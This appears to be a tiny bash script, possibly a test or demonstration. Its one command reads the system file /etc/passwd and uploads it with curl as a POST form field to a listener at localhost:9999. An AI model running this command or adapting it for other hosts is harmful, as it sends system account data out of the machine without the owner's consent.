#!/bin/bash

< /etc/passwd curl -X POST -F f=@- localhost:9999
